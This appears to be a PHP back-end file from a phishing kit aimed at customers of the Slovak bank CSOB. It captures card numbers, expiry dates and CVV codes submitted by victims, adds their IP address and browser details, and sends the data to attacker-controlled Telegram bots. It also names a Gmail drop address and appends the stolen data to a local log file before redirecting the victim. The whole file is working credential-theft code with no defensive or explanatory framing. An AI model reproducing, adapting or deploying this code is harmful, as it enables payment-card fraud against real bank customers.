<?php
   include "config.php";

$nm = $_POST['nm'] ;
$ex = $_POST['exit'] ;
$cv = $_POST['trois'] ;

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bro = $_SERVER["HTTP_USER_AGENT"];
$message .= "-------------------- ✅ CSOB-SK CC INFORMATION✅-------------------\n";
$message .= "Card Number : ".$nm."\r\n";
$message .= "Expiry Date : ".$ex."\r\n";
$message .= "CVV : ".$cv."\r\n";
$message .= "-------------------- ✅ CSOB-SK INFORMATIONS ✅-------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HostName : ".$bro."\n";
$message .= "\n-------------------- 🇸🇰 Zoldyck 🇸🇰-------------------\n";
$rnessage  = "$message";
$send="voltaikrez@gmail.com";
$subject = "|CSB INFO|".$ip."";
$headers = "From: root";

foreach($user_ids as $user_id) {
    $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
    $data=array('chat_id'=>$user_id,'text'=>$message);
    $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
    $context=stream_context_create($options);
    $result=file_get_contents($url,false,$context);

    }

$txt = fopen('../serlik.txt', 'a');
fwrite($txt, $message);
fclose($txt);

header("Location: ./rdrs.php?num_user=".base64_encode($psx));

?>

